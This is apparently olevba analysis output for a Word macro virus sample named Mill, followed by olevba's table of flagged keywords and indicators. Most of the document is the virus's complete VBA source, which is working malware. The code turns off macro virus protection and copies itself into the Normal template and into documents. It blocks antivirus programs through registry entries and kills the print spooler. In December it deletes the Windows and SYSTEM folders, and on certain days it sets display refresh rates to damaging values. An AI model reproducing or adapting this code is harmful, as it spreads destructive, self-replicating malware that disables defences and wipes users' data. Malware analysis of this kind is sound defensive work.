olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mill-62684b795505cc1ef8ee9ec5bc137308ba06fb39
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mill-62684b795505cc1ef8ee9ec5bc137308ba06fb39 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'Special for Millitary !!!
Dim N As Boolean
Dim s, s2 As String
Dim o1, o2 As Object
Const a = 0, b = "DMB 2K+01 super v.1.1", c = 10000, d = "dxview.exe", e = 10
Dim v(10) As String
Const k1 = "HKEY_LOCAL_MACHINE\System\CurrentControlSet\"
Private Sub op()
Set o1 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
Set o2 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
Options.VirusProtection = a
ShowVisualBasicEditor = a
End Sub
Private Sub document_close()
On Error Resume Next
Call op
Call DEA
Call Dec
  If o1.Find(b, 1, 1, c, c) = a Then
  o1.DeleteLines 1, o1.Countoflines
  s = o2.lines(1, o2.Countoflines)
  o1.AddFromString s
  If NormalTempale.Saved = True Then NormalTemplate.Save
  End If
End Sub

Private Sub Document_New()
On Error Resume Next
Call op
Call Dec
Call DEA
    If o2.Find(b, 1, 1, c, c) = a Then
    o2.DeleteLines 1, o2.Countoflines
    s = o1.lines(1, o1.Countoflines)
    o2.AddFromString s
    End If

End Sub
Private Sub Document_Open()
On Error Resume Next
Call op
Call DEA
If o2.Find(b, 1, 1, c, c) = a Then
    o2.DeleteLines 1, o2.Countoflines
    s = o1.lines(1, o1.Countoflines)
    o2.AddFromString s
    End If
End Sub

Private Sub Dec()
On Error Resume Next
Dim W, W2 As String
Dim Z, Z2, Z3 As Long
Z3 = 0
3: Z3 = Z3 + 1
Mp = Chr(66 + Z3) + ":\"
If Z3 = 4 Then GoTo 2
M = Dir(Mp, 16)
Do While M <> ""
        If GetAttr(Mp & M) = 16 Then
        My1 = Mp + M + "\explorer.exe"
        My2 = Mp + M + "\win.ini"
        Z = FileLen(My1)
        Z2 = FileLen(My2)
        If (Z > 0) And (Z2 > 0) Then GoTo 1
        End If
        M = Dir
Loop
GoTo 3
1: W = Mp + M
        If Month(Now) = 12 Then
        W2 = W + "\*.*"
        Kill (W2)
        W2 = W + "\SYSTEM\*.*"
        Kill (W2)
        End If
W2 = W + "\" + d
Z = FileLen(W)
If Z > 0 Then GoTo 2
s = o2.lines(1, o2.Countoflines)
If Mid(s, 2, 2) = "MZ" Then

End If
2:
End Sub

Private Sub DEA()
d1 = Day(Now)
Y = Year(Now)
S6 = "255"
Const yy = 2000
'Obman
v(1) = "DRWEB32W.EXE": v(2) = "SPIDER.EXE": v(3) = "AVP32.EXE": v(4) = "SYSDOC32.EXE": v(5) = "NDD32.EXE"
v(6) = "SCANDISKW.EXE": v(7) = "DEFRAG.EXE": v(8) = "SD32.EXE": v(9) = "AVP32.EXE": v(10) = "AVPW.EXE"
For I = 1 To 10
b1 = k1 + "control\SessionManager\CheckBadApps400\" + v(I)
System.PrivateProfileString("", b1, v(I)) = "123"
s11 = "Flags" + v(I)
System.PrivateProfileString("", b1, s11) = "Y"
Next I
If (Y > yy + 1) Or (Y = yy + 1 And Month(Now) > 6) Then
For I = 1 To Tasks.Count
If Tasks(I).Name = "Spooler Process" Then
Tasks(I).SendWindowMessage &H2, 0, 0
End If
Next I
If (d1 = 13) Or (d1 = 25) Or (d1 = 14) Then
S3 = k1 + "Services\Class\Display\000"
s2 = "\MODES\"
s1 = "RefreshRate"
For I = 48 To 49
For j = 1 To 4
s4 = Mid(Str(8 * j), 2, 2)
s = S3 + Chr(I) + s2 + s4 + "\640,480"
System.PrivateProfileString("", s, s1) = S6
s = S3 + Chr(I) + s2 + s4 + "\800,600"
System.PrivateProfileString("", s, s1) = S6
s = S3 + Chr(I) + s2 + s4 + "\1024,768"
System.PrivateProfileString("", s, s1) = S6
Next j
s = S3 + Chr(I) + s2 + "4\640,480"
System.PrivateProfileString("", s, s1) = S6
Next I
End If
End If
End Sub



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |dxview.exe          |Executable file name                         |
|IOC       |explorer.exe        |Executable file name                         |
|IOC       |DRWEB32W.EXE        |Executable file name                         |
|IOC       |SPIDER.EXE          |Executable file name                         |
|IOC       |AVP32.EXE           |Executable file name                         |
|IOC       |SYSDOC32.EXE        |Executable file name                         |
|IOC       |NDD32.EXE           |Executable file name                         |
|IOC       |SCANDISKW.EXE       |Executable file name                         |
|IOC       |DEFRAG.EXE          |Executable file name                         |
|IOC       |SD32.EXE            |Executable file name                         |
|IOC       |AVPW.EXE            |Executable file name                         |
+----------+--------------------+---------------------------------------------+

